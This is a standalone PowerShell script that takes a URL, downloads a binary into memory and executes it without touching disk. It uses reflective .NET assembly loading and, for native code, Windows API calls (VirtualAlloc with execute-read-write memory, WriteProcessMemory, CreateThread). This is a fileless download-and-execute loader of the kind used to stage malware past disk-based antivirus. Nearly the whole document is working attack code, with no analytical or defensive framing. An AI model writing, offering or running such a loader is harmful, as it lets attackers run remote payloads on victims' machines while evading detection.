# Custom PowerShell script to execute a C++ binary or payload in memory
param (
    [string]$Payload
)

# Function to download and execute a binary in memory
function Execute-BinaryInMemory {
    param (
        [string]$Url
    )
    try {
        # Download the binary into memory as a byte array
        $webClient = New-Object System.Net.WebClient
        $binaryData = $webClient.DownloadData($Url)
        
        # Load the binary into memory and execute it using reflection
        $assembly = [System.Reflection.Assembly]::Load($binaryData)
        $entryPoint = $assembly.EntryPoint
        
        if ($entryPoint) {
            # Invoke the entry point (works for .NET executables; for native C++ binaries, additional steps are needed)
            $entryPoint.Invoke($null, $null)
            Write-Output "Executed binary from $Url in memory."
        } else {
            Write-Error "No entry point found in the binary. Ensure it's a valid executable."
        }
    } catch {
        Write-Error "Error executing binary in memory: $_"
    }
}

# Function to execute native C++ binary in memory (using low-level Windows API)
function Execute-NativeBinaryInMemory {
    param (
        [string]$Url
    )
    try {
        # Download the binary into memory as a byte array
        $webClient = New-Object System.Net.WebClient
        $binaryData = $webClient.DownloadData($Url)
        
        # Use Windows API to allocate memory and execute the binary
        # This is a simplified example and may require additional PE parsing for real-world use
        Add-Type -TypeDefinition @"
        using System;
        using System.Runtime.InteropServices;
        
        public class NativeExecution {
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
            
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
            
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
            
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
        }
"@
        
        # Allocate memory for the binary
        $memSize = $binaryData.Length
        $memPtr = [NativeExecution]::VirtualAlloc([IntPtr]::Zero, $memSize, 0x3000, 0x40) # MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
        
        if ($memPtr -eq [IntPtr]::Zero) {
            Write-Error "Failed to allocate memory for binary."
            return
        }
        
        # Write the binary to the allocated memory
        $bytesWritten = 0
        $success = [NativeExecution]::WriteProcessMemory([IntPtr]::Zero, $memPtr, $binaryData, $memSize, [ref]$bytesWritten)
        
        if (-not $success) {
            Write-Error "Failed to write binary to memory."
            return
        }
        
        # Create a thread to execute the binary in memory
        $threadId = 0
        $threadHandle = [NativeExecution]::CreateThread([IntPtr]::Zero, 0, $memPtr, [IntPtr]::Zero, 0, [ref]$threadId)
        
        if ($threadHandle -eq [IntPtr]::Zero) {
            Write-Error "Failed to create thread for execution."
            return
        }
        
        # Wait for the thread to complete
        [NativeExecution]::WaitForSingleObject($threadHandle, 0xFFFFFFFF)
        Write-Output "Executed native binary from $Url in memory."
    } catch {
        Write-Error "Error executing native binary in memory: $_"
    }
}

# Main logic to handle the payload
function Exec {
    param (
        [string]$Payload
    )
    Write-Output "Processing payload: $Payload"
    
    # Check if the payload is a URL (for downloading a binary)
    if ($Payload -match "^https?://") {
        # Attempt to execute as a native binary in memory (for C++ executables)
        Execute-NativeBinaryInMemory -Url $Payload
    }
    else {
        Write-Error "Unsupported payload type. Provide a URL to a binary for in-memory execution."
    }
}

# Execute the payload passed as an argument
Exec -Payload $Payload
